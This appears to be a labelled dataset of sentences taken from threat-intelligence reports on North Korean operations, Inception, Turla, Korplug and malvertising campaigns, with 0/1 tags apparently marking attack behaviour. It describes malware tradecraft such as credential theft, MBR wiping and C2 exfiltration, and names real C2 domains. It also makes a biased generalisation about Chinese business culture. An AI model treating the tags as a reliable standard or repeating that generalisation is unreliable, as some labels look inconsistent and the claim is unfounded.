• Sanctions against North Korea and export laws prohibit the sale of certain technologies to the regime .	0
In other words , in order to obtain the technology needed for a cyber warfare program , the regime must improvise .	0
North Korea must develop its own technology , manufacture technology using plans obtained via industrial espionage , or rely on third parties to procure it for them .	0
However , the regime has historically failed in its attempts of large-scale production of electronic components .	0
At present , North Korea relies on China to provide much of its network hardware , including servers and routers .	0
It is unlikely that North Korea will compromise on its nuclear program , meaning sanctions will likely be longstanding , and the regime will have to continue to rely on third parties to procure technology .	0
Cyber incidents attributed to North Korean actors seem to follow distinct patterns :  According to reports by other researchers , the conventions and C2 structure used by North Korean cyber actors show continuity and consistency over time .	0
 The majority of the incidents attributed to North Korean actors consistently used wiper malware .	0
 Several of the incidents included defacements , with a different group taking credit each time .	0
Additionally , little information or attack history was found about any of the groups , aside from information acknowledged in this report .	0
These factors seem to indicate that a single group may have been responsible for several attacks over time , using different group names as a false flag .	0
 On more than one occasion , the malware included provisions to disable security software made by South Korean security company AhnLab .	0
This detail strengthens the case that the malware was written or modified to specifically target South Korean machines .	0
 The attacks followed an explicit pattern : most were around the time of U.S. – South Korean joint military exercises , while the others fell on a significant date or were in response to political events .	0
 The primary targets were South Korean and U.S. entities .	0
While these nations are traditionally targeted by the regime , it is also possible that South Korean entities are quick to attribute any attack on their infrastructure to North Korean actors .	0
In fact , in some cases , South Korean reports were the only source of attribution .	0
Does North Korea have sufficient cyber infrastructure and cyber warfare capabilities to harm the U.S. and its allies ? While North Korea 's cyber warfare capabilities pale in comparison to those of wealthier nations , the regime has made significant progress in developing its infrastructure and in establishing cyber operations .	0
The rate of this progress warrants a closer look at North Korea's motivations , TTPs , and capabilities .	0
As noted above , North Korea views the U.S. and South Korea as its primary adversaries .	0
The U.S. and South Korea are high-tech nations with economies that depend heavily on technology .	0
In contrast , North Korea does not have a high tech culture .	0
For these reasons , we should not overestimate the regime 's advanced cyber capability , yet we should never underestimate the potential impact of North Korea utilizing less advanced , quick-and-dirty tactics like DDoS to cripple their high-tech targets .	0
Both government and corporate entities are susceptible to being targeted by North Korean cyber attacks .	0
North Korean juche ideology places the survival of the regime as its primary goal , and any perceived threat to the regime may be targeted .	0
Several attacks on U.S. and South Korean government , financial , and critical infrastructure entities have been attributed to North Korean origins.. These attacks were often preceded by or occurred in conjunction with North Korea voicing negative sentiments about the targeted entities .	0
As we saw with Iranian cyber actors in HPSR Security Briefing Episode 11 , state sponsored cyber actors often launch an attack in response to a political trigger .	0
The same pattern seems to apply to pro-North Korean cyber actors , who have launched attacks to coincide with U.S .	0
Independence Day and the anniversary of the start of the Korean War , as well as propaganda and cyber attacks in response to joint military exercises between the U.S. and South Korea .	0
As shown by North Korea 's past behavior ( which is consistent with their doctrine ) , they are easily '' pushed into a corner '' .	0
At the slightest perceived threat , the regime responds with saber-rattling and peacocking .	0
The regime is extremely defensive and will , in turn , flex its muscles to show the world how capable it is , even if this is an inaccurate display of their overall capabilities .	0
The regime fears losing its control and the nation 's culture to the ever-growing threat of outside influence , as is evidenced in the regime 's reaction to the comedy film '' The Interview '' .	0
The regime has represented itself to its citizens as a powerful and capable entity and has used this status to control the populace .	0
For this reason , the regime 's leaders are forced to continually demonstrate this strength and power , or an illusion thereof , both domestically and globally , in order to maintain the status needed to ensure continued suppression of the population .	0
This show of power may require that the regime takes chances and stretches beyond its abilities at times , but in the spirit of juche and songun , the regime will continue this façade , fearful of losing the image its leaders have worked so hard to maintain .	0
North Korean cyber operations are not generally observed originating from home field IP address space , so geo-IP based blocking of traffic originating from those net-blocks is ineffective .	0
Given that North Korea has capable and technically trained forces and will demonstrate their power when they feel provoked , western entities should consciously avoid promoting ideas or doctrine that is blatantly slanderous to the regime .	0
Encouraging such ideas could cause those entities to become a focal point for North Korean cyber attacks .	0
Due to the fact that North Korean infrastructure is aging and its resources are not able to keep up with the rest of the world , entities with interesting R & D or IP ( intellectual property ) - especially military in nature – could become targets of interest for North Korea .	0
Interest in defense-related IP and R & D could also stem from North Korea 's relationship with China .	0
In the Chinese business culture , taking another entity 's IP or R & D is not stealing – it is accepted as business as usual .	0
It is possible that North Korea , if under Chinese influence , would adopt the same attitude , given the regime 's limited capacity for homegrown innovation .	0
Known DPRK targets have been limited primarily to South Korean and U.S. organizations and government entities .	0
For these targets , prudent measures should include : The dropper component that we examined was distributed as a UPX-packed binary .	0
When executed it creates the following files in the affected user 's % Temp % directory : After determining the location of user profile directories on the affected computer , the malware searches these directories for configuration files and directories that may be associated with the connection manager clients mRemote and SecureCRT .	1
• mRemote-an open source tool for centrally managing remote server connections using a GUI ( Kevin Kline , 2008 ) .	0
This tool is no longer being actively developed or supported .	0
• SecureCRT-a commercial SSH and Telnet client by VanDyke Software .	0
If an mRemote installation is located , the dropper reads the configuration file and checks if there's a NODE that is defined with '' Username=root '' , '' Protocol=SSH '' , and a password that is not blank .	1
If those conditions are satisfied it extracts the information .	1
The password is decrypted after being extracted .	0
If a SecureCRT installation is located , the dropper extracts information from sessions that have Username=root , Protocol=SSH and a saved password .	1
If these conditions are satisfied , the username , hostname , port , and password are extracted .	0
The password is then decrypted .	0
After extracting these connection and server details , the dropper uses the previously dropped alg .	1
exe and conime.exe to attempt to connect remote servers , upload and run the bash script ~pr1.tmp .	1
The bash script initially checks which UNIX it is running on ( of HP-UX , SunOS , Linux , or AIX ) and then attempts to wipe the /kernel , /usr /etc and /home directories , thus rendering the machine inoperative .	1
When the AgentBase.exe component is executed , it first attempts to stop the following processes , presumably in order to evade detection : It then enumerates all physical drives and overwrites the first 512 bytes with the string : '' princpes '' , effectively destroying the MBR ( master boot record ) of the affected drive .	1
It continues to look for removable and fixed drives , locates the root directory on these drives , and then attempts to delete all files and folders in this directory .	1
Finally , the affected computer is shut down and rebooted , although if the wiping mechanisms were successful then the machine will not be able to boot .	1
After reading the Inception paper by Snorre Fagerland and Waylon Grange , I got curious about this threat and did some reversing .	0
I felt that it would be good to write a technical blog about the process - maybe it could be helpful or interesting for some .	0
RTF file Analysis MD5 : 4a4874fa5217a8523bf4d1954efb26ef Exploit : CVE-2012 - 0158 As we can see in following screen shot , this is a RTF [ Rich Text Format ] file .	0
Its common that attackers use document files such as these as bait .	0
It is common that shellcode starts with a NOPsled .	0
In following screenshot we can see that the embedded shellcode starts with NOP slide .	0
NOP , or No OPeration - is a single - byte opcode that does nothing .	0
It has the hex value of 0x90 .	0
Now , to the functionality of the shellcode .	0
We will ignore the first two prolog instructions , and for remaining statements I have inserted comments to help understanding what is happening in this chunk of code .	0
It 's traversing the TEB , the PEB and the Ldr structure to get the base addresses of ntdll.dll and kernel32.dll .	0
It needs these to find the API addresses it requires for the rest of the infection .	0
In screenshot below , Function 00120F82 is the malware 's own GetProcAddress function which takes two parameters The function returns the memory address of the API .	0
As shown in the next screenshot , this function parses the " export name pointer table " of the .dll [ ex .	0
kernel32.dll ] and generates a hash for each function .	0
It compares this with the argument API hash ( Ex DF7D9BAD for GetFileSize , see above screenshot ) using the CMP EDI , ESI instruction .	0
Once the matching API is found it parses the Export Address Table and returns the respective API address to the caller in EAX register .	0
The document contains two levels of shellcode .	0
We are analyzing first level , and in the following code we can see a typical egghunting method : It attempts to open the already opened rtf file by checking file handles in memory .	0
It starts with a handle with the value 4 and verifies it by doing GetFileSize on it .	0
If this fails it does ADD ESI,4 again ( adds 4 to the handle ) until the API succeeds .	0
When this happens it checks the file offset 0x8300 for the marker 0x54405450 .	0
Again , if this matches up , it allocates memory into which it reads the file content and jumps to the 2nd level shellcode with a JMP EBX .	0
Now we have landed into the second level shellcode , but it is obfuscated to evade static analysis .	1
At the initial stage there are few instructions waiting to help us .	0
This is the deobfuscation code .	0
We can see that 0x23B * 4 is the number of bytes obfuscated , POP EBX is the get EIP instruction and 0x5687F945 is the deobfuscation XOR key .	0
In following code we can see the hexadecimal value that corresponds to the library name being pushed to the LoadLibrary function , as well as two loops to get the API addresses using " CALL 02E203E2 " function .	0
Here also it uses hashes to look up APIs .	0
In the following code it searches for the embedded VBS file inside the RTF file in memory .	0
It checks for the file size in a loop , and if the size is larger than 0x2000 then it sets the file ponter to 0x8C14 to compare with the VBS file marker as we can see in following screenshot .	0
After finding the VBS marker in memory , it decrypts the VBS file in two iterations .	0
In the first loop it decrypts and in the second loop it swaps the low and high bytes of the first 0x100 16-bit words , after which it writes the file to a file named " Temp / ew_Rg.vbs " .	0
The following screenshot shows a part of the .VBS payload file dropped by .RTF file .	0
First line is the encrypted .dll 4th line contains Key to decrypt the .dll .	0
Remaining part is self - explanatory .	0
The instruction c = Crypt(c , k ) function decrypts the encrypted dll and returns the decrypted dll .	0
( See the screenshot above ) c= encrypted dll .	0
k = decryption key .	0
Following function writes byte by byte to the dropped.dll file .	0
Finally , the following code executes the " regsvr32 " command to run the wmiprvse.dll in silent mode and sets the run key in registry .	0
This first level of deobfuscation in wmiprvse.dll takes around 3 - 4 minutes to finish .	0
Then it allocates memory using VirtualAlloc and writes the unpacked code to newly allocated memory before it jumps to the unpacked code as shown in following screen shot .	0
This dll has 3 layers of unpacking .	0
The one above is level one , below iyou can see level two .	0
We can see the passing of the control to the newly unpacked .dll @CALL EAX .	0
It 's very time - consuming to understand the functionality of the dll as it decrypts and builds its own runtime import table to hinder the analysis .	1
Analyst can not directly see which API gets called .	0
Finally we can see it 's connecting to webdav.cloudme.com and cleartext credentials in following screenshot .	1
Malware tries to communicate with the user account created at the WebDAV C&C to exfiltrate system and user information .	1
Reference .	0
https://www.bluecoat.com / security - blog/2014 - 12 - 09/blue - coat - exposes-%E2%80%9C- inception - framework%E2%80%9D - very - sophisticated - layered - malware	0
File name : varies MD5 : a3cbf6179d437909eb532b7319b3dafe Compilation timestamp : 2012.10.02 10:51:50 ( GMT ) Compiler : Microsoft Visual Studio 2010 File format : PE32 DLL Exports : _ LowLevelKeyboardProc@12 Creates the log file : % TEMP%\~DFD3O8.tmp .	1
If failed , tries to write to the file f:\keyhook.log Each time the keylogger starts , it appends the following header to the log file .	0
-------------------------------------------------------------------------------- New Session : % fully qualified computer name% % timestamp% -------------------------------------------------------------------------------- It then creates a hidden console window and registers its only export _ LowLevelKeyboardProc@12 as a hook procedure for low - level keyboard input events ( WH_KEYBOARD_LL hook ) .	1
Depending on the results , it writes a line to its log file .	0
In case the hook was installed , the line is " Started ... " , else " LoadLibrary ' % path to its file% ' failed , % error code% " .	0
It also starts a thread that retrieves the current foreground window handle every 100 milliseconds .	0
This handle is then used in the keyboard hook procedure .	0
The low - level keyboard hook procedure intercepts WM_KEYDOWN , WM_KEYUP and WM _ SYSKEYDOWN system messages and writes information about each keystroke to the log file .	1
Every time a new window becomes active , it retrieves its name and the path to its application and writes this information to the log file .	0
[ % path to the application 's executable file% : " % window title% " ] Analyzed file ( others are similar ) .	0
Compilation timestamp : 2013.10.15 10:43:09 ( GMT ) File format : PE32 DLL , modified ( the file is supposed to be started by a custom loader ) Exports .	0
The main functionality is implemented in a single function that is called by the DllMain entry point .	0
The exported functions allow to call the same function directly ( exported as " start " ) or to start / stop it in a separate thread ( " ModuleStart"/"ModuleStop " ) and with slightly different parameters .	0
This indicates the backdoor can also function as a plugin for the Turla Carbon system .	0
The main function executes in an infinite loop .	0
It collects most of the available information about the system , transmits it to the C&C server and executes the commands it receives back .	1
The module delays execution for random periods while it discovers running processes with one of the following filenames .	0
The following system information is collected .	0
The retrieved information is compressed using bzip2 , encrypted with AES and then encoded using Base64 before being transmitted to the C&C server .	1
When there is a file waiting for upload ( usually , this is file that contains the results of the previously received and executed command ) , it is read from disk and uploaded to the server instead of the system information .	1
The C&C communication is implemented on top of the standard HTTP / HTTPS protocols .	0
The list of the C&C URLs is hardcoded in the binary but may be overridden by further commands .	0
The module uses Wininet API functions for issuing HTTP POST requests to the server .	1
The module transmits the collected information in the body of the POST request and gets new commands from the server 's response .	1
The request body can be empty if there is no new information to upload .	0
The response is usually an HTML document and the commands are Base64-encoded strings enclosed in < div>/</div > tags .	0
Every command is encrypted using asymmetric encryption with temporary AES session keys .	0
Each command is a mixed text / binary buffer .	0
It consists of two parts : payload and configuration .	0
The configuration is an INI file that controls the further behavior of the module .	1
It is extracted into a temporary file named % TEMP%\~D%random%.tmp .	0
The payload , if exists , is supposed to be an executable file and may be executed if there is a corresponding command present in the INI part .	0
The format of the decoded command is the following .	0
Format of the C&C command buffer Available commands are .	0
Lateral movement tools .	0
Epic / Tavdig backdoors .	0
Dropper packages that installs both Epic and Turla Carbon system .	0
PDF exploits used in spearphishing attacks drops Epic backdoor .	0
SCR / EXE files - used in spearphishing / social engineering .	0
Fake " Adobe Flash Player " Epic backdoor installers .	0
Fake " Microsoft Security Essentials Quick Scan " Epic backdoor installer Turla Carbon Pfinet backdoors Turla Carbon package Related Turla sample module Java Exploits used in waterhole attacks	0
After taking a look at recent Korplug ( PlugX ) detections , we identified two larger scale campaigns employing this well-known Remote Access Trojan .	1
This blog gives an overview of the first one , related to Afghanistan & Tajikistan .	0
The other campaign , where the targets were a number of high-profile organizations in Russia , will be the subject of Anton Cherepanov 's presentation at the ZeroNights security conference in Moscow this week .	0
Sometimes malware used in various attacks is unique enough to identify related incidents , which makes tracking individual botnets simpler .	0
An example is the BlackEnergy Lite variant ( also known as BlackEnergy 3 ) used by a group of attackers ( that was then given the name Quedagh , or Sandworm ) against targets in Ukraine and other countries .	0
BlackEnergy Lite is clearly distinguishable from the numerous binaries of the more common BlackEnergy 2 also circulating in-the-wild .	0
In other cases , attackers use more common tools for accomplishing their criminal goals .	0
For example , the Korplug RAT ( a.k.a .PlugX ) is a well-known toolkit associated with Chinese APT groups and used in a large number of targeted attacks since 2012 .	1
For the past several weeks we have taken a closer look at a great number of detections of this malware in many unrelated incidents .	0
Among these , we were able to discover several successful infections where the employed Korplug samples were connecting to the same C & C domain .	1
Other Korplug samples were connecting to a different domain name resolving to the same IPs as notebookhk.net : Taking these C & Cs as a starting point , we were able to locate a number of victims infected through various exploit-laden spear-phishing documents and cunningly-named archives .	1
A table with a selection of RTF documents and RAR self-extracting archives with a .SCR	0
extension is shown below : Some of the above-mentioned files also contained decoy documents : In all of the cases , three binary files were dropped ( apart from decoy documents ) that led to the Korplug trojan being loading into memory .	1
The Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables and is a way to stay under the radar , since a trusted application with a valid signature among startup items is less likely to raise suspicion .	1
The maliciously crafted documents are RTF files that successfully exploit the CVE-2012-0158 vulnerability in Microsoft Word .	1
The image below shows the beginning of the CVE-2012-0158 shellcode in ASCII encoding within the document ( the opcodes 60 , 55 , 8bec disassemble to pusha ; push ebp ; mov ebp , esp ) .	0
Interestingly , though , the documents also contain the newer CVE-2014-1761 exploit that was extensively used in targeted attacks carried out by a number other malware families this year ( including BlackEnergy , Sednit , MiniDuke , and others ) .	0
However , this exploit is not implemented correctly due to a wrong file offset in the 1st stage shellcode .	0
Below we see the disassembly of the 1st stage shellcode where it checks the presence of the tag '' p ! 11 '' marking the beginning of the 2nd stage shellcode and loads it into memory .	0
Even though the tag and 2nd stage shellcode is present in the RTF , it 's at a different offset , and thus never is loaded .	0
Sophos ' Gabor Szappanos gives a possible explanation how these malformed samples may have come into existence .	0
ESET LiveGrid telemetry indicates that the attacks against these targets have been going on since at least June 2014 and continue through today .	0
We were able to pinpoint the targets to residents of the following countries : From the topics of the files used to spread the malware , as well as from the affected targets , it appears that the attackers are interested in gathering intelligence related to Afghan , Tajik and Russian military and diplomatic subjects .	0
Interestingly , most of the affected victims have another thing in common – a number of other RATs , file stealing trojans or keyloggers were detected on their systems on top of the Korplug RAT detection .	0
One of these 'alternative RATs ' was connecting to a domain also used by the Korplug samples .	1
Since the functionality of these tools was partly overlapping with that of Korplug , it left us wondering whether the attackers were just experimenting with different RATs or were they supplementing some functionality that they were unable to accomplish .	0
Additional information about two malware families that were most often found accompanying Korplug infections is given below .	0
A curious Remote Access Trojan , as research points to a Chinese connection but the commands it listens to are in Spanish ( translation in English ) : The malware can manage processes and services on the infected machine , transfer files to and from the C & C server , run shell commands , and so on .	1
It is written in Delphi and connects to www.dicemention.com .	1
Some samples contain a digital signature by '' Nanning weiwu Technology co. , ltd '' .	0
This malware , written in C , and contains several functions for harvesting files off the victim 's hard drive according to criteria set in the configuration file .	1
Apart from doing a recursive sweep of all logical fixed and remote drives , it also continually monitors any attached removable media or network shares by listening to DBTDEVICEARRIVAL events .	1
In addition to collecting files , the malware attempts to gather saved passwords , history of visited URLs , account information and proxy information from the following applications : The C & C domains used by this malware are : Some samples of this file stealer detected in these campaigns also contain the signature by '' Nanning weiwu Technology co. , ltd '' – another indicator that the infections are related .	1
Most targeted attacks against organizations originate as spear-phish campaigns or watering hole style web driveby attacks .	1
Within the last six months , Invincea has discovered and stopped targeted malvertizing attacks against specific companies -- particularly those in the Defense Industrial Base .	0
The combination of traditional cyber crime methods ( malvertising ) with targeted attacks against Defense industrials for theft of IP represents another development in the on-going blending of techniques from cyber crime and advanced threat actors with nation state agendas .	0
We are tracking an on-going campaign against US Defense companies under the code name Operation DeathClick .	0
Traditional malvertizing has been an effective but indiscriminate method cyber crime gangs use to compromise endpoints to perpetrate ad fraud , identity fraud , and banking credential theft .	1
In this new targeted variation of malvertizing , the perpetrators are attacking specific organizations by leveraging real- time ad bidding networks and micro-targeting techniques developed over the last decade in online advertising .	0
The objective of these micro-targeted attacks against the Defense sector is likely theft of Intellectual Property more than ad fraud and indicates motive and sophistication characteristic of advanced threat actors .	0
Since these attacks were blocked by Invincea prior to compromise of the machine or network , we can not confirm the specific IP the perpetrators are after – only the Tactics , Techniques , and Protocols ( TTPs ) used which we describe herein , similar to methods used to provide backdoor access and command and control over compromised networks .	1
While we discovered these attacks across multiple Defense companies , we expect it will not be long , if not already , before other highly targeted segments including Federal , Financial Services , Manufacturing , and HealthCare are victimized with the same micro-targeted malvertising .	0
The campaign described here does not represent a single flaw , 0-day , or unpatched bug , but rather a significant development in the adversary 's capabilities and strategy to leverage legitimate online advertising platforms on well-known ad supported websites via a technique called Real-Time Ad Bidding .	0
In other words , this problem will not be patched on Tuesday .	0
UPDATE : We have updated this document to include a new section on a campaign of distributing CryptoWall ransomware via malvertising .	0
While the attack vector is the same , we believe this to be motivated by cybercrime rather than theft of IP from Defense companies .	0
Malvertising has seen meteoric rise in 2014 .	0
Threat actors create a corporate front , advertise on commonly visited sites , then later switch out the landing pages for their ads to pages that host exploit kits , or simply create a temporary redirection from their usual content to the malicious landing page .	1
These exploit kits are hosted on compromised web servers across the world .	0
In other words , they leverage legitimate ad-supported popular websites together with compromised websites for hosting exploit landing pages , defeating black-listing techniques .	0
The lifetime of these ads and landing pages are measured in hours .	0
In the campaign described here , Operation DeathClick , traditional malvertising has been armed with a micro-targeting system using IP address ranges , geographically narrowed down to zip codes , and interests of the user ( recorded in cookies ) to target specific companies , company types , and user interests/preferences .	1
They are employing the tactics of real-time ad bidding to guarantee malicious ad delivery to intended targets of the campaign – building on a decade of work in real-time analytics for online ad placement , but for nefarious purposes .	0
The threat actors redirect their ads for just minutes at a time and then abandon their exploit kit pages forever .	0
This means that list-based threat intelligence feeds are rendered ineffective .	0
The domains used do not appear in any proxy blacklist , and the malware droppers delivered by the exploit pages always employ different signatures , evading traditional network and endpoint detection technology .	0
Ad delivery networks today are not incentivized to address the problem in a credible manner as they derive revenue from the criminal enterprise , while not being held accountable .	0
Turning a blind eye to the problem is rewarded economically .	0
Meanwhile the perpetrators are able to use traditional malvertising and ad fraud bots to fund the criminal enterprise .	0
Without cooperation of ad networks to vet the advertisers working through front companies , this attack vector will go unchecked .	0
And now , with the advent of real-time ad bidding , these threat actors have weaponized ad delivery networks to target victims based on : Real-time ad bidding allows advertisers , and by extension , adversaries , to micro-target ad delivery on an extremely granular basis .	1
For example , oppressive regimes trying to gather intelligence on activist protests can deliver ads to people getting email from within a specific locality where they are protesting .	0
Today , it is commonplace for micro-targeting techniques to be used as part of the toolset in legitimate online advertising .	0
For instance , a defense contractor , trying to win a new omnibus contract , can deliver targeted ads to online news sites frequented by Government program personnel .	0
The latest software product release can be delivered to Windows users visiting PC Magazine 's website .	0
A local car dealership can sense when someone is in the market for a new car and can deliver advertising to those users , based solely on browsing history .	0
Now advanced threat actors are able to target an organization directly via micro-targeted malvertising , based solely on their corporate network IP range .	1
Thus , it does n't matter where in the world you point your web browser -- an online video poker room , a fantasy football club homepage , a Pakistani news homepage , or even checking your own webmail at a trusted email provider .	0
Those ad windows can and are being used to deliver malware if the bidding price is right .	1
Recently , multiple US Defense/Aerospace contractors were targeted by a malvertising campaign .	1
These contractors had deployed world-class enterprise security defense in depth approaches to protect their intellectual property .	0
They had next generation firewalls that relied on threat intelligence feeds to do auto-blocking of known malicious sites .	0
They had malware interception technology that relied on known bad hashes to prevent malicious downloads .	0
The multiple proxies in place subscribed to real time feeds of known bad URLs .	0
They deployed AV at the gateways and on the endpoints .	0
But in a two week period , these organizations were hit with dozens of micro-targeted malvertising attacks , each of which would have provided a beachhead for the threat actors from which to compromise the network , if successful .	1
In each instance , the attacks were carried out by targeting these Defense contractors directly via real-time ad bidding .	1
Once targeted , an end user only needed to browse to any website , anywhere in the world , which contained a DoubleClick ad-partner embedded window .	0
Invincea stopped these attacks on the endpoints by containing the delivered exploits in secure virtual containers , while producing the forensics that led to this discovery .	0
Next we go in some detail about example attacks perpetrated against the defense firms .	0
It is important to note that the websites we show next that served up targeted malvertising were victims of malvertising campaigns with no knowledge of the malicious ads they were serving up .	0
These malicious ads were served up by 3rd party networks , who are unwittingly sourcing malicious content .	0
As we will discuss later , the 3rd party ad networks themselves are falling victim to malicious content campaigns .	0
A user visited his online fantasy football league homepage at Fleaflicker.com .	0
As soon as the page loaded , a malicious ad delivered a backdoor Trojan via a Java-based exploit .	1
Figure 1 shows a screenshot of the page that was visited .	0
You will notice the two inline ad placements for DoubleClick ad delivery .	0
The malware delivered came from a compromised Polish website , and would have installed a generic backdoor Trojan .	1
Note the prominent ad placements by AdChoice , a DoubleClick affiliate .	0
Figure 2 shows an event tree of the exploit and malware delivered from an ad by visiting Fleaflicker.com .	1
The event tree in Figure 2 taken from Invincea 's Threat Management Console shows the exploited Java process dropped a file called fvJcrgR0.exe , and that it likely came from Pubmatic , an ad delivery network that allows for real time bidding to deliver ads .	1
In this instance , the Pubmatic server redirected to a Web server in Poland that dropped the malware .	1
The timeline below shows the exact times and URLs visited .	0
Note the number of re-directs from Fleaflicker.com to different outside properties in Figure 3 .	0
Invincea Threat Management provides a quick way to search for an MD5 hash on third party sites ( see Figure 4 ) .	0
By clicking the VirusTotal link , the analyst will see the following VirusTotal report in Figure 5 : From the VirusTotal report in Figure 5 , you will see that this malware is a Trojan backdoor that would likely be used to download additional malware or to provide remote persistent access to the attacker .	1
An employee at a defense contractor visited a free Texas Poker online game .	0
The Poker site had advertisements on the page , one of which launched a similar attack as seen in before on other websites visited by employees at this firm .	0
It should be noted that Gpokr.com no longer appears to be serving advertisements from their site .	0
At the time of the incident , as seen in the logs below , an ad window was previously present .	0
In the event tree shown in Figure 7 , you will see that the winning bid redirected to a direct-to-IP site instead of a site via domain name .	0
Also , above is the first indication of specific executable DLL files .	0
Searches for these filenames returned zero results on VirusTotal .	0
This event on September 14 ( Figure 8 ) shows that delivery.first-impression.com redirected directly to an IP address , not a domain name to deliver its malicious payload .	1
Note the multiple DLL files written to disk and the spawning of rundll32.exe .	0
At this point , the Invincea-protected host recognized the unauthorized process and reverted itself to a clean state .	0
In another incident an employee checked their online Earthlink account .	0
When they replied to an email , a new ad was loaded on a page that attempted to exploit Java .	1
This malvertising was from the same IP address seen in other incidents .	0
You will notice the inline advertisements on this page in Figure 9 .	0
The event tree in Figure 10 notes that this was likely a spear-phish attack .	1
The timeline will show that when the user replied to an email , the ads on the Earthlink page refreshed , dropping the exploit code via Java .	1
Note in the timeline in Figure 11 , how there was a 7 minute gap between the DoubleClick ad redirect and the delivery.first-impression.com ad .	0
This is an indication that the page was refreshed or the ad was refreshed on the page .	0
The same exploit IP address from the Gpokr event is present .	0
This event is the oldest , happening on September 11 .	0
The three examples above are samples of the more than two dozen micro-targeted attacks we have witnessed and blocked as part of Operation DeathClick since mid-September .	0
Defense Industrial Base customers witnessed micro-targeted malvertising at a rate six times that of comparable private sector companies with similar defense-in-depth capabilities .	0
We observed in Operation DeathClick that real-time ad bidding networks are being used by criminal enterprise to target companies with malicious content in order to gain persistent remote access .	1
In these third-party arrangements , the content is frequently not vetted because billions of impressions are rendered in real-time .	0
Most of the content is legitimate ads .	0
A small fraction is malicious content linking to landing pages that infect users .	1
Real-time ad networks are being used , often unwittingly , and some have taken steps to try and combat malicious use of their networks .	0
The Online Trust Alliance is one such industry group comprised of major software companies and ad networks working together to try and address this problem .	0
Our goal in this paper is to shed light on the micro-targeting of companies by criminal enterprise employing real-time ad networks , and to aid the industry in collectively addressing this problem .	0
Real-time ad bidding networks have evolved over the last ten years as a means of micro-targeting customers with advertising content they are more likely to click-on .	0
From Wikipedia : Real-time bidding ( RTB ) refers to the means by which ad inventory is bought and sold on a per- impression basis , via programmatic instantaneous auction , similar to financial markets .	0
[ 1 ] With real-time bidding , advertising buyers bid on an impression and , if the bid is won , the buyer 's ad is instantly displayed on the publisher 's site .	0
[ 2 ] Real-time bidding lets advertisers manage and optimize ads from multiple ad-networks by granting the user access to a multitude of different networks , allowing them to create and launch advertising campaigns , prioritize networks and allocate advertising stock .	0
Real-time bidding is a dynamic bidding process where each impression is bid for in ( near ) real time , against a static auction where the impressions are typically bundled in groups of 1,000 .	0
A typical transaction begins with a user visiting a website .	0
This triggers a bid request that can include various pieces of data such as the user 's demographic information , browsing history , location , and the page being loaded .	0
The request goes from the publisher to an ad exchange , which submits it and the accompanying data to multiple advertisers who automatically submit bids in real time to place their ads .	0
Advertisers bid on each ad impression as it is served .	0
The impression goes to the highest bidder and their ad is served on the page.This process is repeated for every ad slot on the page .	0
Real time bidding transactions typically happen within 100 milliseconds from the moment the ad exchange received the request .	0
The bidding happens autonomously and advertisers set maximum bids and budgets for an advertising campaign .	0
The criteria for bidding on particular types of consumers can be very complex , taking into account everything from very detailed behavioral profiles to conversion data .	0
The following infographic summarizes how advanced adversaries are now micro-targeting companies using malvertising .	0
The marketplace and auction of ads sounds great for actual ads .	0
But what if the landing pages that are supposed to be ads are actually malicious PHP pages with embedded malware ? The bidding and ad placements work the same , but instead of seeing a flashy ad banner , the highest bidder for the placement serves malware .	1
The price to win the bid to push malvertising to any page you happen to visit ranges from 45 to 75 cents per impression .	0
A malicious advertiser on a network may serve crafted , seemingly normal ads , a majority of the time .	0
In fact , the ads are often stolen copies from legitimate advertisers .	0
This establishes the attacker 's legitimacy and trust on the ad network .	0
Of course with real-time ad bidding , he can simply offer up low bids and his content would consistently lose in the marketplace .	0
But it is very simple to replace the redirection code to switch from a legitimate ad banner to a drop site that hosts an exploit kit , typically based on Java , Flash , Silverlight , or all three .	1
Once the malvertiser detects that he has several infected hosts , he removes the redirection code and goes back to serving standard ad banners .	0
He then '' burns '' his temporary exploit kit drop site , moving his exploits to another location for a new campaign .	0
This allows the malicious advertiser to perform hit and run attacks , infect whomever he wants at whatever time he wants , and maintain his presence on the advertising marketplace without drawing undue attention to his activities .	0
In the sections below , we will provide highlights of the RTB industry , its targeting capabilities , and show how malvertisers have been mis-appropriating RTB networks to deliver malware .	0
The RTB ad networks provide significant micro-targeting capabilities that have long been used to serve legitimate content to users more likely to click on them .	0
In the following , we describe these capabilities to show the state of the art in RTB network capabilities .	0
The quoted material below are direct quotes from Real Time Bidding service providers linked .	0
Emphasis added by Invincea .	0
Audience Targeting : Bid on the audiences most valuable to you .	0
Each impression in the PubMatic auction can be enhanced with first- and third-party data ; giving buyers targeting capabilities across display , mobile , tablet and video inventory .	0
Media buyers can also cookie sync with publisher audiences to incorporate CRM , retargeting and exclusion strategies in their digital advertising .	0
Buyers have access to proprietary audience segments either directly through Private Marketplace deals or through the open market .	0
With hundreds of parameters available to you , PubMatic has your best audiences waiting for you .	0
With PubMatic , buyers are able to access pre-defined vertical or audience packages , seasonal packages , publisher and/or site-specific inventory packages as well as pre-selected publisher packages and pricing available in Private Marketplaces .	0
'' First-Impression Buy-Side offers the granular targeting , tracking , and reporting needed to help our clients make the most of their spend , along with an expert support team to advise when needed .	0
By leveraging real time buying , First-Impression Buy-Side gives media buyers the full control to maximize the value of an impression .	0
'' Could Malvertisers Track Exploits and their cost per impression ? Yes .	0
Many RTB networks provide a control panel to track advertising campaigns in real-time , along with notifications that bids have been won and who exactly was served the malware .	0
Below is a URL redirection log from First-Impression.com from a winning bid by a malvertiser .	0
In the URL are parameters such as the type of ad , the type of user-agent string of the ad reader specified ( which discloses browser and java versions ) , whether it is a retargeted ad based off of cookies ( this one was not ) , the price paid , which is 65.4 cents , and the notification to the malvertiser that his malvertising was delivered .	0
DoubleClick discusses their targeting capabilities in online documentation .	0
Since they specialize in knowing the location of their ad windows , they market those ad spaces to the actual advertisers and malvertisers , along with targeted demographics about the content pages , the visitors to the sites and more .	0
To showcase the variety of impression-level data available to buyers , consider the data made available through a connection to DoubleClick Ad Exchange 's real-time bidding API .	0
With ADX , a buyer could consider any of the following data passed from the seller with each impression : • Ad slot parameters : visibility ( above or below the fold ) , size , excluded creative attributes , excluded advertiser URLs , allowed vendor or ad technology .	0
• Geo parameters : country , region , metro , city .	0
• Content parameters : site URL , site language , seller network , vertical or category .	0
• User parameters : browser , operating system , anonymous cookie ( hashed ) , cookie age .	0
Just like when considering one type of data , by using the anonymous cookie parameter , buyers can consider first-party retargeting or third-party audience data from a data provider .	0
However , they can go further in the evaluation by looking at more of these parameters .	0
This helps a buyer learn much more about a particular user and a particular impression , gain a smarter answer to the three essential questions and make a more data-driven decision .	0
This sounds like a great way to advertise if you are in the marketing industry .	0
